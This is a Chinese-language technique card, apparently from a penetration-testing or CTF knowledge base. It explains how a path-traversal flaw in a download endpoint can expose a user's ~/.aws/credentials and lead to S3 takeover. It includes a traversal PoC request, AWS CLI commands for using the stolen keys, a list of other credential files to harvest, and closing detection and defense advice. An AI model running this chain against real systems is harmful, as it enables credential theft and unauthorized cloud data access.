---
id: web-generic-file-inclusion-download-traversal-aws-credentials
title: 下载接口路径穿越读取用户 ~/.aws/credentials：从任意文件读取升级为 AWS AK/SK 接管 S3
type: scenario
domain: web
path: web/generic/file-inclusion
technique: download-path-traversal-aws-credentials-harvest
aliases:
- download?file=../../.aws/credentials
- 任意文件读取云凭据
- 路径穿越读 AWS 密钥
- web 文件读取到 S3
- .aws/credentials 泄露
tags:
- web
- file-inclusion
- path-traversal
- aws
- credential
- cloud
- s3
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V660
  verified_at: '2026-11-13T06:49:04+08:00'
  notes: 已对照12456原文挑战5与图01核对：图01 Burp GET /download?file=../../../../../../home/nedf/.aws/credentials 返回200与 [default] AK/SK，卡片路径参数与响应头一致（卡片用8级../与占位<user>，示意性）；get-caller-identity 确认 user/nedf 后 s3 cp 取 flag 与原文一致；/etc/passwd 先找用户再读 .aws 的经验亦源自原文。dedup 与测绘找AK、EFS挂载等卡非同链。PoC 未复跑。
---

## 一句话结论

当 Web 的下载接口把 `file` 参数直接拼接到基准目录、未做 `realpath`/白名单校验时，`GET /download?file=../../../../../../../../home/<user>/.aws/credentials` 可读出该用户的 AWS 长期密钥；配置 AK/SK 后 `aws sts get-caller-identity` 确认身份，即可按权限读取 S3 中的 flag/业务数据。

## 原理

- 路径穿越（`../`）能逃逸下载目录，读取 Web 进程或宿主用户可读的任意文件；`~/.aws/credentials` 是 AWS CLI 的明文 INI 配置，保存 `aws_access_key_id`/`aws_secret_access_key`，长期密钥默认不过期。
- Web 主机常同时承担运维/迁移脚本角色；开发、运维用户的 home 目录下有 `.aws` 配置，Web 进程若以该用户或高权用户运行，或目录权限宽松，就能被下载接口读到。
- 拿到 AK/SK 后无需再打网络边界：AWS 签名认证让攻击者从公网直接以该 IAM 身份调用 API，先 `get-caller-identity` 确认账号，再 `s3 ls/cp`、`ec2 describe-*`、`dynamodb scan` 等按权限取数据。
- 因此“任意文件读取”在云环境中要优先当作“云凭据读取”来评估：先看 `/etc/passwd` 找可读的 home，再逐个尝试 `.aws/credentials`、`.aws/config`、`.docker/config.json`、`.kube/config`、`.env`。

## 触发条件

- 存在文件下载/预览接口，`file`/`path`/`filename` 等参数可控且未规范化校验。
- Web 进程可读目标用户的 `~/.aws/credentials`（同机部署、权限宽松或 Web 以该用户运行）。
- 泄露的 AK/SK 仍有效，且所属 IAM 身份有可访问的云资源。
- 攻击者可直连 AWS API（通常可以）。

## 利用步骤

1. 确认穿越：`GET /download?file=../../../../../../etc/passwd` 返回系统文件。
2. 枚举 home 用户：从 `/etc/passwd` 取 `/home/*` 或 `/root`，逐个尝试 `.aws/credentials`。
3. 读取凭据：`GET /download?file=../../../../../../../../home/<user>/.aws/credentials`，得到 `aws_access_key_id` 与 `aws_secret_access_key`。
4. 本地配置并确认身份：`aws configure`，`aws sts get-caller-identity`。
5. 按权限取数据：`aws s3 ls`、`aws s3 cp s3://<bucket>/flag.txt .`；必要时继续枚举 IAM/RDS/快照。
6. 若密钥无效，尝试其它用户 home、`.env`、CI 配置、`/root/.aws` 等位置。

## PoC

```text
GET /download?file=../../../../../../../../home/<user>/.aws/credentials HTTP/1.1
Host: <target>

HTTP/1.1 200 OK
Content-Disposition: inline; filename=credentials

[default]
aws_access_key_id = AKIA...
aws_secret_access_key = ...
```

```bash
aws configure   # 填入读到的 AK/SK 与区域
aws sts get-caller-identity
aws s3 ls
aws s3 cp s3://<bucket>/flag.txt ./flag.txt
```

## 变体与关联

- 变体：目标路径换成 `/root/.aws/credentials`、`/home/*/.aws/config`（可能含 role 配置）、`.docker/config.json`（镜像仓库凭据）、`.kube/config`、`.env`、`.git-credentials`、CI 变量文件。
- 变体：Web 进程以 www-data 运行时读不到用户 home，可转向应用自身配置（`wp-config.php`、`config.json`、`.env`）或 `/proc/<pid>/environ` 中的环境变量密钥。
- 关联：[[cloud-cloud-iam-aws-access-key-leak-search-engine-takeover]]（拿到 AK/SK 后的权限枚举与接管）、[[pentest-privilege-escalation-credential-file-harvesting]]（本地壳下的同类凭据文件搜索）、[[web-generic-file-inclusion-cloudweb-report-download-filename-traversal]]（下载文件名穿越的同类入口）。
- 边界：下载接口做了 `realpath`/白名单/后缀校验、Web 用户无 home 读权限、密钥已轮换或仅有极小权限时链路中断。

## 检测与防御

- 检测：下载接口参数中出现 `../`/`..%2f`/绝对路径；对 `.aws`、`.ssh`、`.env`、`.kube` 等敏感路径的访问；CloudTrail 中出现来自异常 IP 的 `GetCallerIdentity`、`ListBuckets`、`GetObject` 调用。
- 防御：下载接口用文件 ID/白名单替代路径拼接，`realpath` 后校验前缀；Web 进程以最小权限运行，隔离 home 与云凭据；禁止在 Web 主机存放长期 AK/SK，改用实例角色/临时凭据；对泄露密钥做 rotation 与 secret scanning。
